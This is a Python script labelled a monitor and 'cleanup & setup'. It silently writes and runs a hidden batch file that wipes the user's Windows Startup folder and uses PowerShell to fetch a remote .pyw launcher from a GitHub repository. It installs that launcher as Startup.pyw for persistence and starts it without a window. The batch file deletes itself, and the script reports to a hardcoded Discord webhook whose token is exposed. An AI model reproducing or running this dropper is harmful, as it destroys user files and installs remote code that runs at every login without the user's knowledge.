# monitor_script.py - Creates only Startup.pyw, not both files
import os
import sys
import subprocess
import tempfile
import time
import urllib.request
import requests

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    """Send simple webhook"""
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def cleanup_and_setup():
    """Delete everything and create only Startup.pyw"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Create batch file that does everything
    batch_script = f'''@echo off
cd /d "{startup_folder}"

echo [CLEANUP] Deleting ALL files...

:: Delete EVERYTHING except what we'll create
del /f /q *.* 2>nul

:: Delete all specific file types
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.pyc 2>nul
del /f /q *.bat 2>nul

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo [SETUP] Creating new Startup.pyw...

:: Download github_launcher.pyw from GitHub and save as Startup.pyw ONLY
powershell -Command "
try {{
    $url = 'https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw'
    $code = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    [System.IO.File]::WriteAllText('{startup_folder}\\Startup.pyw', $code)
    Write-Host 'Downloaded launcher as Startup.pyw'
}} catch {{
    Write-Host 'Download failed'
}}
"

echo [VERIFY] Checking files...
dir /b

echo [COMPLETE] Only Startup.pyw should remain
timeout /t 2 /nobreak >nul
del "%~f0" 2>nul
'''
    
    # Save and run batch file
    batch_path = tempfile.gettempdir() + "/setup_only.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run hidden
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    process = subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    # Wait for completion
    time.sleep(5)
    
    # Verify only Startup.pyw exists
    startup_path = os.path.join(startup_folder, "Startup.pyw")
    github_path = os.path.join(startup_folder, "github_launcher.pyw")
    
    files_in_startup = os.listdir(startup_folder)
    print(f"Files in startup: {files_in_startup}")
    
    # Check if github_launcher.pyw exists and delete it
    if os.path.exists(github_path):
        try:
            os.remove(github_path)
            print("✓ Deleted github_launcher.pyw")
        except:
            pass
    
    # Make sure Startup.pyw exists
    if os.path.exists(startup_path):
        print("✓ Startup.pyw created successfully")
        return True
    else:
        print("✗ Failed to create Startup.pyw")
        return False

def start_new_launcher():
    """Start the new launcher"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        launcher_path = os.path.join(startup_folder, "Startup.pyw")
        
        if os.path.exists(launcher_path):
            print("Starting new launcher...")
            
            # Run the launcher
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            subprocess.Popen(
                [sys.executable, launcher_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return True
            
    except Exception as e:
        print(f"Failed to start launcher: {e}")
    
    return False

def main():
    """Main function"""
    print("=" * 60)
    print("SINGLE FILE CLEANUP & SETUP")
    print("=" * 60)
    
    # Step 1: Cleanup and create only Startup.pyw
    print("\n[1/2] Setting up ONLY Startup.pyw...")
    if cleanup_and_setup():
        print("✓ Cleanup successful")
        
        # Step 2: Start new launcher
        print("\n[2/2] Starting new launcher...")
        start_new_launcher()
        
        # Send webhook
        send_webhook("✅ Cleanup complete! Only Startup.pyw remains in startup folder.")
        
        print("\n" + "=" * 60)
        print("SUCCESS!")
        print("✓ Startup folder cleaned")
        print("✓ Only Startup.pyw created")
        print("✓ New launcher started")
        print("=" * 60)
    else:
        print("✗ Setup failed")
        send_webhook("❌ Cleanup failed!")
    
    # Wait before exit
    time.sleep(3)

if __name__ == "__main__":
    main()
